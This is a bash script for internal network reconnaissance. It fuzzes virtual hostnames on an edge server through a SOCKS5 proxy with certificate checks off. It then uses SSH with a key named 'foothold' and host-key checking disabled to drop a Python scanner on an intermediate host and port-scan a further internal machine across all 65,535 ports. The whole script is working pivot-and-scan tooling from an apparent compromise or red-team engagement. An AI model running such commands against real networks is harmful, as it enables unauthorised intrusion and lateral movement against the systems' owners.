#!/bin/bash
echo "== vhost fuzz on edge 10.77.51.60 =="
for h in gate access checkin check-in appointment appointments visitor visitors site ops portal inspection inspect roster contractor crew gatehouse security reception booking schedule maintenance outlet outlets field; do
  for dom in arwc.test; do
    r=$(curl -sS -m 8 --socks5-hostname 127.0.0.1:1080 -k -H "Host: $h.$dom" -o /tmp/vh.$$ -w '%{http_code}' https://10.77.51.60/ 2>/dev/null)
    body=$(head -c 120 /tmp/vh.$$ | tr -d '\n')
    echo "$h.$dom -> $r $body"
  done
done
rm -f /tmp/vh.$$
echo "== compare Host: connector.arwc.test on .51.60 =="
curl -sS -m 8 --socks5-hostname 127.0.0.1:1080 -k -H 'Host: connector.arwc.test' -w '\n[%{http_code}]\n' https://10.77.51.60/ 2>&1 | head -3
echo "== full port scan 10.77.60.20 from rowan-dev =="
ssh -o StrictHostKeyChecking=no -i ~/.ssh/keplerops-foothold -p 2222 rowan@10.50.13.180 'cat > /tmp/fs.py <<"PY"
import asyncio
host="10.77.60.20"
sem=asyncio.Semaphore(1500)
openp=[]
async def chk(p):
    async with sem:
        try:
            r,w=await asyncio.wait_for(asyncio.open_connection(host,p),2.0)
            openp.append(p); w.close()
        except Exception: pass
async def main():
    await asyncio.gather(*(chk(p) for p in range(1,65536)))
    print(sorted(openp))
asyncio.run(main())
PY
timeout 120 python3 /tmp/fs.py' 2>&1
